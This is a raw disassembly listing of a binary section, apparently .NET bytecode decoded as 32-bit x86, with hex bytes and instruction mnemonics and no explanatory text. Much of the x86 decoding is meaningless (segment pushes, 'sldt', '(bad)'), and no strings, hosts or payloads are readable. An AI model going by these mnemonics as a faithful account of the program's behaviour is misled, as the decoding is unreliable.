  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	06                   	push   %es
  4025c3:	00 16                	add    %dl,(%esi)
  4025c5:	28 1a                	sub    %bl,(%edx)
  4025c7:	00 00                	add    %al,(%eax)
  4025c9:	06                   	push   %es
  4025ca:	00 14 fe             	add    %dl,(%esi,%edi,8)
  4025cd:	06                   	push   %es
  4025ce:	22 00                	and    (%eax),%al
  4025d0:	00 06                	add    %al,(%esi)
  4025d2:	73 35                	jae    0x402609
  4025d4:	00 00                	add    %al,(%eax)
  4025d6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  4025d9:	21 00                	and    %eax,(%eax)
  4025db:	00 0a                	add    %cl,(%edx)
  4025dd:	20 e8                	and    %ch,%al
  4025df:	03 00                	add    (%eax),%eax
  4025e1:	00 20                	add    %ah,(%eax)
  4025e3:	b8 0b 00 00 6f       	mov    $0x6f00000b,%eax
  4025e8:	2c 00                	sub    $0x0,%al
  4025ea:	00 0a                	add    %cl,(%edx)
  4025ec:	73 21                	jae    0x40260f
  4025ee:	00 00                	add    %al,(%eax)
  4025f0:	0a 20                	or     (%eax),%ah
  4025f2:	e8 03 00 00 20       	call   0x204025fa
  4025f7:	b8 0b 00 00 6f       	mov    $0x6f00000b,%eax
  4025fc:	2c 00                	sub    $0x0,%al
  4025fe:	00 0a                	add    %cl,(%edx)
  402600:	73 36                	jae    0x402638
  402602:	00 00                	add    %al,(%eax)
  402604:	0a 28                	or     (%eax),%ch
  402606:	11 00                	adc    %eax,(%eax)
  402608:	00 06                	add    %al,(%esi)
  40260a:	00 14 fe             	add    %dl,(%esi,%edi,8)
  40260d:	06                   	push   %es
  40260e:	23 00                	and    (%eax),%eax
  402610:	00 06                	add    %al,(%esi)
  402612:	73 35                	jae    0x402649
  402614:	00 00                	add    %al,(%eax)
  402616:	0a 14 17             	or     (%edi,%edx,1),%dl
  402619:	17                   	pop    %ss
  40261a:	73 36                	jae    0x402652
  40261c:	00 00                	add    %al,(%eax)
  40261e:	0a 28                	or     (%eax),%ch
  402620:	16                   	push   %ss
  402621:	00 00                	add    %al,(%eax)
  402623:	06                   	push   %es
  402624:	00 14 fe             	add    %dl,(%esi,%edi,8)
  402627:	06                   	push   %es
  402628:	1c 00                	sbb    $0x0,%al
  40262a:	00 06                	add    %al,(%esi)
  40262c:	73 35                	jae    0x402663
  40262e:	00 00                	add    %al,(%eax)
  402630:	0a 14 20             	or     (%eax,%eiz,1),%dl
  402633:	2c 01                	sub    $0x1,%al
  402635:	00 00                	add    %al,(%eax)
  402637:	20 20                	and    %ah,(%eax)
  402639:	03 00                	add    (%eax),%eax
  40263b:	00 73 36             	add    %dh,0x36(%ebx)
  40263e:	00 00                	add    %al,(%eax)
  402640:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  402646:	28 08                	sub    %cl,(%eax)
  402648:	00 00                	add    %al,(%eax)
  40264a:	06                   	push   %es
  40264b:	28 0a                	sub    %cl,(%edx)
  40264d:	00 00                	add    %al,(%eax)
  40264f:	06                   	push   %es
  402650:	28 0e                	sub    %cl,(%esi)
  402652:	00 00                	add    %al,(%eax)
  402654:	06                   	push   %es
  402655:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  40265b:	69 14 fe 06 20 00 00 	imul   $0x2006,(%esi,%edi,8),%edx
  402662:	06                   	push   %es
  402663:	73 37                	jae    0x40269c
  402665:	00 00                	add    %al,(%eax)
  402667:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  40266a:	38 00                	cmp    %al,(%eax)
  40266c:	00 0a                	add    %cl,(%edx)
  40266e:	26 00 2b             	add    %ch,%es:(%ebx)
  402671:	0a 00                	or     (%eax),%al
  402673:	16                   	push   %ss
  402674:	28 13                	sub    %dl,(%ebx)
  402676:	00 00                	add    %al,(%eax)
  402678:	06                   	push   %es
  402679:	00 de                	add    %bl,%dh
  40267b:	19 00                	sbb    %eax,(%eax)
  40267d:	de 16                	ficoms (%esi)
  40267f:	26 00 72 77          	add    %dh,%es:0x77(%edx)
  402683:	01 00                	add    %eax,(%eax)
  402685:	70 28                	jo     0x4026af
  402687:	2e 00 00             	add    %al,%cs:(%eax)
  40268a:	0a 00                	or     (%eax),%al
  40268c:	16                   	push   %ss
  40268d:	28 13                	sub    %dl,(%ebx)
  40268f:	00 00                	add    %al,(%eax)
  402691:	06                   	push   %es
  402692:	00 de                	add    %bl,%dh
  402694:	00 2a                	add    %ch,(%edx)
  402696:	00 00                	add    %al,(%eax)
  402698:	41                   	inc    %ecx
  402699:	4c                   	dec    %esp
  40269a:	00 00                	add    %al,(%eax)
  40269c:	00 00                	add    %al,(%eax)
  40269e:	00 00                	add    %al,(%eax)
  4026a0:	d9 00                	flds   (%eax)
  4026a2:	00 00                	add    %al,(%eax)
  4026a4:	24 00                	and    $0x0,%al
  4026a6:	00 00                	add    %al,(%eax)
  4026a8:	fd                   	std
  4026a9:	00 00                	add    %al,(%eax)
  4026ab:	00 05 00 00 00 0f    	add    %al,0xf000000
  4026b1:	00 00                	add    %al,(%eax)
  4026b3:	01 02                	add    %eax,(%edx)
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 31                	add    %dh,(%ecx)
  4026b9:	01 00                	add    %eax,(%eax)
  4026bb:	00 7f 00             	add    %bh,0x0(%edi)
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	b0 01                	mov    $0x1,%al
  4026c2:	00 00                	add    %al,(%eax)
  4026c4:	0d 00 00 00 00       	or     $0x0,%eax
  4026c9:	00 00                	add    %al,(%eax)
  4026cb:	00 00                	add    %al,(%eax)
  4026cd:	00 00                	add    %al,(%eax)
  4026cf:	00 01                	add    %al,(%ecx)
  4026d1:	00 00                	add    %al,(%eax)
  4026d3:	00 2e                	add    %ch,(%esi)
  4026d5:	03 00                	add    (%eax),%eax
  4026d7:	00 2f                	add    %ch,(%edi)
  4026d9:	03 00                	add    (%eax),%eax
  4026db:	00 16                	add    %dl,(%esi)
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	00 0f                	add    %cl,(%edi)
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	01 13                	add    %edx,(%ebx)
  4026e5:	30 01                	xor    %al,(%ecx)
  4026e7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4026ea:	00 00                	add    %al,(%eax)
  4026ec:	02 00                	add    (%eax),%al
  4026ee:	00 11                	add    %dl,(%ecx)
  4026f0:	00 28                	add    %ch,(%eax)
  4026f2:	12 00                	adc    (%eax),%al
  4026f4:	00 06                	add    %al,(%esi)
  4026f6:	0a 06                	or     (%esi),%al
  4026f8:	2c 09                	sub    $0x9,%al
  4026fa:	00 14 28             	add    %dl,(%eax,%ebp,1)
  4026fd:	22 00                	and    (%eax),%al
  4026ff:	00 06                	add    %al,(%esi)
  402701:	00 00                	add    %al,(%eax)
  402703:	2a 13                	sub    (%ebx),%dl
  402705:	30 02                	xor    %al,(%edx)
  402707:	00 0f                	add    %cl,(%edi)
  402709:	00 00                	add    %al,(%eax)
  40270b:	00 02                	add    %al,(%edx)
  40270d:	00 00                	add    %al,(%eax)
  40270f:	11 00                	adc    %eax,(%eax)
  402711:	02 28                	add    (%eax),%ch
  402713:	39 00                	cmp    %eax,(%eax)
  402715:	00 0a                	add    %cl,(%edx)
  402717:	16                   	push   %ss
  402718:	fe 03                	incb   (%ebx)
  40271a:	0a 2b                	or     (%ebx),%ch
  40271c:	00 06                	add    %al,(%esi)
  40271e:	2a 00                	sub    (%eax),%al
  402720:	13 30                	adc    (%eax),%esi
  402722:	02 00                	add    (%eax),%al
  402724:	07                   	pop    %es
  402725:	00 00                	add    %al,(%eax)
  402727:	00 02                	add    %al,(%edx)
  402729:	00 00                	add    %al,(%eax)
  40272b:	11 00                	adc    %eax,(%eax)
  40272d:	17                   	pop    %ss
  40272e:	0a 2b                	or     (%ebx),%ch
  402730:	00 06                	add    %al,(%esi)
  402732:	2a 00                	sub    (%eax),%al
  402734:	1b 30                	sbb    (%eax),%esi
  402736:	02 00                	add    (%eax),%al
  402738:	56                   	push   %esi
	...
  402741:	00 28                	add    %ch,(%eax)
  402743:	08 00                	or     %al,(%eax)
  402745:	00 06                	add    %al,(%esi)
  402747:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40274c:	06                   	push   %es
  40274d:	28 3a                	sub    %bh,(%edx)
  40274f:	00 00                	add    %al,(%eax)
  402751:	0a 00                	or     (%eax),%al
  402753:	28 06                	sub    %al,(%esi)
  402755:	00 00                	add    %al,(%eax)
  402757:	06                   	push   %es
  402758:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40275d:	06                   	push   %es
  40275e:	28 3b                	sub    %bh,(%ebx)
  402760:	00 00                	add    %al,(%eax)
  402762:	0a 00                	or     (%eax),%al
  402764:	28 15 00 00 06 25    	sub    %dl,0x25060000
  40276a:	2d 03 26 2b 06       	sub    $0x62b2603,%eax
  40276f:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402772:	00 0a                	add    %cl,(%edx)
  402774:	00 28                	add    %ch,(%eax)
  402776:	10 00                	adc    %al,(%eax)
  402778:	00 06                	add    %al,(%esi)
  40277a:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40277f:	06                   	push   %es
  402780:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402783:	00 0a                	add    %cl,(%edx)
  402785:	00 00                	add    %al,(%eax)
  402787:	de 05 26 00 00 de    	fiadds 0xde000026
  40278d:	00 16                	add    %dl,(%esi)
  40278f:	28 13                	sub    %dl,(%ebx)
  402791:	00 00                	add    %al,(%eax)
  402793:	06                   	push   %es
  402794:	00 2a                	add    %ch,(%edx)
  402796:	00 00                	add    %al,(%eax)
  402798:	01 10                	add    %edx,(%eax)
  40279a:	00 00                	add    %al,(%eax)
  40279c:	00 00                	add    %al,(%eax)
  40279e:	01 00                	add    %eax,(%eax)
  4027a0:	48                   	dec    %eax
  4027a1:	49                   	dec    %ecx
  4027a2:	00 05 0f 00 00 01    	add    %al,0x100000f
  4027a8:	1b 30                	sbb    (%eax),%esi
  4027aa:	06                   	push   %es
  4027ab:	00 20                	add    %ah,(%eax)
  4027ad:	02 00                	add    (%eax),%al
  4027af:	00 05 00 00 11 00    	add    %al,0x110000
  4027b5:	00 28                	add    %ch,(%eax)
  4027b7:	06                   	push   %es
  4027b8:	00 00                	add    %al,(%eax)
  4027ba:	06                   	push   %es
  4027bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4027bc:	25 00 00 0a 2c       	and    $0x2c0a0000,%eax
  4027c1:	0a 28                	or     (%eax),%ch
  4027c3:	12 00                	adc    (%eax),%al
  4027c5:	00 06                	add    %al,(%esi)
  4027c7:	16                   	push   %ss
  4027c8:	fe 01                	incb   (%ecx)
  4027ca:	2b 01                	sub    (%ecx),%eax
  4027cc:	17                   	pop    %ss
  4027cd:	0b 07                	or     (%edi),%eax
  4027cf:	2c 0d                	sub    $0xd,%al
  4027d1:	00 16                	add    %dl,(%esi)
  4027d3:	28 13                	sub    %dl,(%ebx)
  4027d5:	00 00                	add    %al,(%eax)
  4027d7:	06                   	push   %es
  4027d8:	00 dd                	add    %bl,%ch
  4027da:	f5                   	cmc
  4027db:	01 00                	add    %eax,(%eax)
  4027dd:	00 28                	add    %ch,(%eax)
  4027df:	08 00                	or     %al,(%eax)
  4027e1:	00 06                	add    %al,(%esi)
  4027e3:	02 6f 3d             	add    0x3d(%edi),%ch
  4027e6:	00 00                	add    %al,(%eax)
  4027e8:	0a 0a                	or     (%edx),%cl
  4027ea:	06                   	push   %es
  4027eb:	16                   	push   %ss
  4027ec:	fe 02                	incb   (%edx)
  4027ee:	0c 08                	or     $0x8,%al
  4027f0:	39 c6                	cmp    %eax,%esi
  4027f2:	01 00                	add    %eax,(%eax)
  4027f4:	00 00                	add    %al,(%eax)
  4027f6:	28 0e                	sub    %cl,(%esi)
  4027f8:	00 00                	add    %al,(%eax)
  4027fa:	06                   	push   %es
  4027fb:	06                   	push   %es
  4027fc:	6a 58                	push   $0x58
  4027fe:	28 0f                	sub    %cl,(%edi)
  402800:	00 00                	add    %al,(%eax)
  402802:	06                   	push   %es
  402803:	00 28                	add    %ch,(%eax)
  402805:	0c 00                	or     $0x0,%al
  402807:	00 06                	add    %al,(%esi)
  402809:	06                   	push   %es
  40280a:	6a 59                	push   $0x59
  40280c:	28 0d 00 00 06 00    	sub    %cl,0x60000
  402812:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402815:	00 06                	add    %al,(%esi)
  402817:	16                   	push   %ss
  402818:	6a fe                	push   $0xfffffffe
  40281a:	01 0d 09 39 54 01    	add    %ecx,0x1543909
  402820:	00 00                	add    %al,(%eax)
  402822:	00 28                	add    %ch,(%eax)
  402824:	0a 00                	or     (%eax),%al
  402826:	00 06                	add    %al,(%esi)
  402828:	16                   	push   %ss
  402829:	28 3e                	sub    %bh,(%esi)
  40282b:	00 00                	add    %al,(%eax)
  40282d:	0a 6a 28             	or     0x28(%edx),%ch
  402830:	0d 00 00 06 00       	or     $0x60000,%eax
  402835:	72 93                	jb     0x4027ca
  402837:	01 00                	add    %eax,(%eax)
  402839:	70 28                	jo     0x402863
  40283b:	0c 00                	or     $0x0,%al
  40283d:	00 06                	add    %al,(%esi)
  40283f:	13 04 12             	adc    (%edx,%edx,1),%eax
  402842:	04 28                	add    $0x28,%al
  402844:	3f                   	aas
  402845:	00 00                	add    %al,(%eax)
  402847:	0a 72 c1             	or     -0x3f(%edx),%dh
  40284a:	01 00                	add    %eax,(%eax)
  40284c:	70 28                	jo     0x402876
  40284e:	40                   	inc    %eax
  40284f:	00 00                	add    %al,(%eax)
  402851:	0a 28                	or     (%eax),%ch
  402853:	2e 00 00             	add    %al,%cs:(%eax)
  402856:	0a 00                	or     (%eax),%al
  402858:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40285b:	00 06                	add    %al,(%esi)
  40285d:	16                   	push   %ss
  40285e:	6a fe                	push   $0xfffffffe
  402860:	02 13                	add    (%ebx),%dl
  402862:	05 11 05 39 e6       	add    $0xe6390511,%eax
  402867:	00 00                	add    %al,(%eax)
  402869:	00 00                	add    %al,(%eax)
  40286b:	16                   	push   %ss
  40286c:	6a 28                	push   $0x28
  40286e:	0f 00 00             	sldt   (%eax)
  402871:	06                   	push   %es
  402872:	00 28                	add    %ch,(%eax)
  402874:	0c 00                	or     $0x0,%al
  402876:	00 06                	add    %al,(%esi)
  402878:	d4 8d                	aam    $0x8d
  40287a:	59                   	pop    %ecx
  40287b:	00 00                	add    %al,(%eax)
  40287d:	01 28                	add    %ebp,(%eax)
  40287f:	0b 00                	or     (%eax),%eax
  402881:	00 06                	add    %al,(%esi)
  402883:	00 2b                	add    %ch,(%ebx)
  402885:	74 00                	je     0x402887
  402887:	28 08                	sub    %cl,(%eax)
  402889:	00 00                	add    %al,(%eax)
  40288b:	06                   	push   %es
  40288c:	28 0a                	sub    %cl,(%edx)
  40288e:	00 00                	add    %al,(%eax)
  402890:	06                   	push   %es
  402891:	28 0e                	sub    %cl,(%esi)
  402893:	00 00                	add    %al,(%eax)
  402895:	06                   	push   %es
  402896:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  40289c:	69 6f 41 00 00 0a 13 	imul   $0x130a0000,0x41(%edi),%ebp
  4028a3:	07                   	pop    %es
  4028a4:	11 07                	adc    %eax,(%edi)
  4028a6:	16                   	push   %ss
  4028a7:	fe 02                	incb   (%edx)
  4028a9:	16                   	push   %ss
  4028aa:	fe 01                	incb   (%ecx)
  4028ac:	13 08                	adc    (%eax),%ecx
  4028ae:	11 08                	adc    %ecx,(%eax)
  4028b0:	2c 0d                	sub    $0xd,%al
  4028b2:	00 16                	add    %dl,(%esi)
  4028b4:	28 13                	sub    %dl,(%ebx)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	06                   	push   %es
  4028b9:	00 dd                	add    %bl,%ch
  4028bb:	14 01                	adc    $0x1,%al
  4028bd:	00 00                	add    %al,(%eax)
  4028bf:	28 0e                	sub    %cl,(%esi)
  4028c1:	00 00                	add    %al,(%eax)
  4028c3:	06                   	push   %es
  4028c4:	11 07                	adc    %eax,(%edi)
  4028c6:	6a 58                	push   $0x58
  4028c8:	28 0f                	sub    %cl,(%edi)
  4028ca:	00 00                	add    %al,(%eax)
  4028cc:	06                   	push   %es
  4028cd:	00 28                	add    %ch,(%eax)
  4028cf:	0c 00                	or     $0x0,%al
  4028d1:	00 06                	add    %al,(%esi)
  4028d3:	11 07                	adc    %eax,(%edi)
  4028d5:	6a 59                	push   $0x59
  4028d7:	28 0d 00 00 06 00    	sub    %cl,0x60000
  4028dd:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4028e0:	00 06                	add    %al,(%esi)
  4028e2:	16                   	push   %ss
  4028e3:	6a fe                	push   $0xfffffffe
  4028e5:	04 13                	add    $0x13,%al
  4028e7:	09 11                	or     %edx,(%ecx)
  4028e9:	09 2c 0d 00 16 28 13 	or     %ebp,0x13281600(,%ecx,1)
  4028f0:	00 00                	add    %al,(%eax)
  4028f2:	06                   	push   %es
  4028f3:	00 dd                	add    %bl,%ch
  4028f5:	da 00                	fiaddl (%eax)
  4028f7:	00 00                	add    %al,(%eax)
  4028f9:	00 28                	add    %ch,(%eax)
  4028fb:	0c 00                	or     $0x0,%al
  4028fd:	00 06                	add    %al,(%esi)
  4028ff:	16                   	push   %ss
  402900:	6a fe                	push   $0xfffffffe
  402902:	02 13                	add    (%ebx),%dl
  402904:	0a 11                	or     (%ecx),%dl
  402906:	0a 3a                	or     (%edx),%bh
  402908:	7a ff                	jp     0x402909
  40290a:	ff                   	(bad)
  40290b:	ff 14 fe             	call   *(%esi,%edi,8)
  40290e:	06                   	push   %es
  40290f:	47                   	inc    %edi
  402910:	00 00                	add    %al,(%eax)
  402912:	06                   	push   %es
  402913:	73 42                	jae    0x402957
  402915:	00 00                	add    %al,(%eax)
  402917:	0a 73 43             	or     0x43(%ebx),%dh
  40291a:	00 00                	add    %al,(%eax)
  40291c:	0a 13                	or     (%ebx),%dl
  40291e:	06                   	push   %es
  40291f:	11 06                	adc    %eax,(%esi)
  402921:	28 0a                	sub    %cl,(%edx)
  402923:	00 00                	add    %al,(%eax)
  402925:	06                   	push   %es
  402926:	6f                   	outsl  %ds:(%esi),(%dx)
  402927:	44                   	inc    %esp
  402928:	00 00                	add    %al,(%eax)
  40292a:	0a 00                	or     (%eax),%al
  40292c:	16                   	push   %ss
  40292d:	6a 28                	push   $0x28
  40292f:	0f 00 00             	sldt   (%eax)
  402932:	06                   	push   %es
  402933:	00 1a                	add    %bl,(%edx)
  402935:	6a 28                	push   $0x28
  402937:	0d 00 00 06 00       	or     $0x60000,%eax
  40293c:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40293f:	00 06                	add    %al,(%esi)
  402941:	d4 8d                	aam    $0x8d
  402943:	59                   	pop    %ecx
  402944:	00 00                	add    %al,(%eax)
  402946:	01 28                	add    %ebp,(%eax)
  402948:	0b 00                	or     (%eax),%eax
  40294a:	00 06                	add    %al,(%esi)
  40294c:	00 00                	add    %al,(%eax)
  40294e:	2b 23                	sub    (%ebx),%esp
  402950:	00 1a                	add    %bl,(%edx)
  402952:	6a 28                	push   $0x28
  402954:	0d 00 00 06 00       	or     $0x60000,%eax
  402959:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40295c:	00 06                	add    %al,(%esi)
  40295e:	d4 8d                	aam    $0x8d
  402960:	59                   	pop    %ecx
  402961:	00 00                	add    %al,(%eax)
  402963:	01 28                	add    %ebp,(%eax)
  402965:	0b 00                	or     (%eax),%eax
  402967:	00 06                	add    %al,(%esi)
  402969:	00 16                	add    %dl,(%esi)
  40296b:	6a 28                	push   $0x28
  40296d:	0f 00 00             	sldt   (%eax)
  402970:	06                   	push   %es
  402971:	00 00                	add    %al,(%eax)
  402973:	00 2b                	add    %ch,(%ebx)
  402975:	19 28                	sbb    %ebp,(%eax)
  402977:	0c 00                	or     $0x0,%al
  402979:	00 06                	add    %al,(%esi)
  40297b:	16                   	push   %ss
  40297c:	6a fe                	push   $0xfffffffe
  40297e:	04 13                	add    $0x13,%al
  402980:	0b 11                	or     (%ecx),%edx
  402982:	0b 2c 0a             	or     (%edx,%ecx,1),%ebp
  402985:	00 16                	add    %dl,(%esi)
  402987:	28 13                	sub    %dl,(%ebx)
  402989:	00 00                	add    %al,(%eax)
  40298b:	06                   	push   %es
  40298c:	00 de                	add    %bl,%dh
  40298e:	44                   	inc    %esp
  40298f:	28 08                	sub    %cl,(%eax)
  402991:	00 00                	add    %al,(%eax)
  402993:	06                   	push   %es
  402994:	28 0a                	sub    %cl,(%edx)
  402996:	00 00                	add    %al,(%eax)
  402998:	06                   	push   %es
  402999:	28 0e                	sub    %cl,(%esi)
  40299b:	00 00                	add    %al,(%eax)
  40299d:	06                   	push   %es
  40299e:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  4029a4:	69 14 fe 06 20 00 00 	imul   $0x2006,(%esi,%edi,8),%edx
  4029ab:	06                   	push   %es
  4029ac:	73 37                	jae    0x4029e5
  4029ae:	00 00                	add    %al,(%eax)
  4029b0:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  4029b3:	38 00                	cmp    %al,(%eax)
  4029b5:	00 0a                	add    %cl,(%edx)
  4029b7:	26 00 2b             	add    %ch,%es:(%ebx)
  4029ba:	0a 00                	or     (%eax),%al
  4029bc:	16                   	push   %ss
  4029bd:	28 13                	sub    %dl,(%ebx)
  4029bf:	00 00                	add    %al,(%eax)
  4029c1:	06                   	push   %es
  4029c2:	00 de                	add    %bl,%dh
  4029c4:	0e                   	push   %cs
  4029c5:	00 de                	add    %bl,%dh
  4029c7:	0b 26                	or     (%esi),%esp
  4029c9:	00 16                	add    %dl,(%esi)
  4029cb:	28 13                	sub    %dl,(%ebx)
  4029cd:	00 00                	add    %al,(%eax)
  4029cf:	06                   	push   %es
  4029d0:	00 de                	add    %bl,%dh
  4029d2:	00 2a                	add    %ch,(%edx)
  4029d4:	41                   	inc    %ecx
  4029d5:	1c 00                	sbb    $0x0,%al
  4029d7:	00 00                	add    %al,(%eax)
  4029d9:	00 00                	add    %al,(%eax)
  4029db:	00 01                	add    %al,(%ecx)
  4029dd:	00 00                	add    %al,(%eax)
  4029df:	00 13                	add    %dl,(%ebx)
  4029e1:	02 00                	add    (%eax),%al
  4029e3:	00 14 02             	add    %dl,(%edx,%eax,1)
  4029e6:	00 00                	add    %al,(%eax)
  4029e8:	0b 00                	or     (%eax),%eax
  4029ea:	00 00                	add    %al,(%eax)
  4029ec:	0f 00 00             	sldt   (%eax)
  4029ef:	01 1b                	add    %ebx,(%ebx)
  4029f1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4029f4:	2d 01 00 00 06       	sub    $0x6000001,%eax
  4029f9:	00 00                	add    %al,(%eax)
  4029fb:	11 00                	adc    %eax,(%eax)
  4029fd:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402a00:	00 06                	add    %al,(%esi)
  402a02:	0a 16                	or     (%esi),%dl
  402a04:	0b 06                	or     (%esi),%eax
  402a06:	12 01                	adc    (%ecx),%al
  402a08:	28 45 00             	sub    %al,0x0(%ebp)
  402a0b:	00 0a                	add    %cl,(%edx)
  402a0d:	00 00                	add    %al,(%eax)
  402a0f:	00 28                	add    %ch,(%eax)
  402a11:	12 00                	adc    (%eax),%al
  402a13:	00 06                	add    %al,(%esi)
  402a15:	16                   	push   %ss
  402a16:	fe 01                	incb   (%ecx)
  402a18:	0d 09 2c 06 00       	or     $0x62c09,%eax
  402a1d:	dd 06                	fldl   (%esi)
  402a1f:	01 00                	add    %eax,(%eax)
  402a21:	00 02                	add    %al,(%edx)
  402a23:	8e 69 28             	mov    0x28(%ecx),%gs
  402a26:	46                   	inc    %esi
  402a27:	00 00                	add    %al,(%eax)
  402a29:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  402a2c:	06                   	push   %es
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	15 17 6f 47 00       	adc    $0x476f17,%eax
  402a35:	00 0a                	add    %cl,(%edx)
  402a37:	26 28 08             	sub    %cl,%es:(%eax)
  402a3a:	00 00                	add    %al,(%eax)
  402a3c:	06                   	push   %es
  402a3d:	08 16                	or     %dl,(%esi)
  402a3f:	08 8e 69 6f 48 00    	or     %cl,0x486f69(%esi)
  402a45:	00 0a                	add    %cl,(%edx)
  402a47:	00 02                	add    %al,(%edx)
  402a49:	8e 69 20             	mov    0x20(%ecx),%gs
  402a4c:	40                   	inc    %eax
  402a4d:	42                   	inc    %edx
  402a4e:	0f 00                	(bad)
  402a50:	fe 02                	incb   (%edx)
  402a52:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402a55:	04 39                	add    $0x39,%al
  402a57:	87 00                	xchg   %eax,(%eax)
  402a59:	00 00                	add    %al,(%eax)
  402a5b:	00 72 d9             	add    %dh,-0x27(%edx)
  402a5e:	01 00                	add    %eax,(%eax)
  402a60:	70 28                	jo     0x402a8a
  402a62:	2e 00 00             	add    %al,%cs:(%eax)
  402a65:	0a 00                	or     (%eax),%al
  402a67:	02 73 49             	add    0x49(%ebx),%dh
  402a6a:	00 00                	add    %al,(%eax)
  402a6c:	0a 13                	or     (%ebx),%dl
  402a6e:	05 00 16 13 06       	add    $0x6131600,%eax
  402a73:	11 05 16 6a 6f 4a    	adc    %eax,0x4a6f6a16
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	0a 00                	or     (%eax),%al
  402a7d:	20 50 c3             	and    %dl,-0x3d(%eax)
  402a80:	00 00                	add    %al,(%eax)
  402a82:	8d 59 00             	lea    0x0(%ecx),%ebx
  402a85:	00 01                	add    %al,(%ecx)
  402a87:	13 07                	adc    (%edi),%eax
  402a89:	2b 2a                	sub    (%edx),%ebp
  402a8b:	00 28                	add    %ch,(%eax)
  402a8d:	06                   	push   %es
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	06                   	push   %es
  402a91:	15 17 6f 47 00       	adc    $0x476f17,%eax
  402a96:	00 0a                	add    %cl,(%edx)
  402a98:	26 28 08             	sub    %cl,%es:(%eax)
  402a9b:	00 00                	add    %al,(%eax)
  402a9d:	06                   	push   %es
  402a9e:	11 07                	adc    %eax,(%edi)
  402aa0:	16                   	push   %ss
  402aa1:	11 06                	adc    %eax,(%esi)
  402aa3:	6f                   	outsl  %ds:(%esi),(%dx)
  402aa4:	48                   	dec    %eax
  402aa5:	00 00                	add    %al,(%eax)
  402aa7:	0a 00                	or     (%eax),%al
  402aa9:	28 08                	sub    %cl,(%eax)
  402aab:	00 00                	add    %al,(%eax)
  402aad:	06                   	push   %es
  402aae:	6f                   	outsl  %ds:(%esi),(%dx)
  402aaf:	4b                   	dec    %ebx
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 00                	or     (%eax),%al
  402ab4:	00 11                	add    %dl,(%ecx)
  402ab6:	05 11 07 16 11       	add    $0x11160711,%eax
  402abb:	07                   	pop    %es
  402abc:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402abf:	41                   	inc    %ecx
  402ac0:	00 00                	add    %al,(%eax)
  402ac2:	0a 25 13 06 16 fe    	or     0xfe160613,%ah
  402ac8:	02 13                	add    (%ebx),%dl
  402aca:	08 11                	or     %dl,(%ecx)
  402acc:	08 2d bc 00 de 0d    	or     %ch,0xdde00bc
  402ad2:	11 05 2c 08 11 05    	adc    %eax,0x511082c
  402ad8:	6f                   	outsl  %ds:(%esi),(%dx)
  402ad9:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402ade:	dc 00                	faddl  (%eax)
  402ae0:	2b 2a                	sub    (%edx),%ebp
  402ae2:	00 28                	add    %ch,(%eax)
  402ae4:	06                   	push   %es
  402ae5:	00 00                	add    %al,(%eax)
  402ae7:	06                   	push   %es
  402ae8:	15 17 6f 47 00       	adc    $0x476f17,%eax
  402aed:	00 0a                	add    %cl,(%edx)
  402aef:	26 28 08             	sub    %cl,%es:(%eax)
  402af2:	00 00                	add    %al,(%eax)
  402af4:	06                   	push   %es
  402af5:	02 16                	add    (%esi),%dl
  402af7:	02 8e 69 6f 48 00    	add    0x486f69(%esi),%cl
  402afd:	00 0a                	add    %cl,(%edx)
  402aff:	00 28                	add    %ch,(%eax)
  402b01:	08 00                	or     %al,(%eax)
  402b03:	00 06                	add    %al,(%esi)
  402b05:	6f                   	outsl  %ds:(%esi),(%dx)
  402b06:	4b                   	dec    %ebx
  402b07:	00 00                	add    %al,(%eax)
  402b09:	0a 00                	or     (%eax),%al
  402b0b:	00 00                	add    %al,(%eax)
  402b0d:	de 0b                	fimuls (%ebx)
  402b0f:	26 00 16             	add    %dl,%es:(%esi)
  402b12:	28 13                	sub    %dl,(%ebx)
  402b14:	00 00                	add    %al,(%eax)
  402b16:	06                   	push   %es
  402b17:	00 de                	add    %bl,%dh
  402b19:	0e                   	push   %cs
  402b1a:	00 de                	add    %bl,%dh
  402b1c:	0b 07                	or     (%edi),%eax
  402b1e:	2c 07                	sub    $0x7,%al
  402b20:	06                   	push   %es
  402b21:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  402b25:	0a 00                	or     (%eax),%al
  402b27:	dc 2a                	fsubrl (%edx)
  402b29:	00 00                	add    %al,(%eax)
  402b2b:	00 41 4c             	add    %al,0x4c(%ecx)
  402b2e:	00 00                	add    %al,(%eax)
  402b30:	02 00                	add    (%eax),%al
  402b32:	00 00                	add    %al,(%eax)
  402b34:	73 00                	jae    0x402b36
  402b36:	00 00                	add    %al,(%eax)
  402b38:	63 00                	arpl   %eax,(%eax)
  402b3a:	00 00                	add    %al,(%eax)
  402b3c:	d6                   	salc
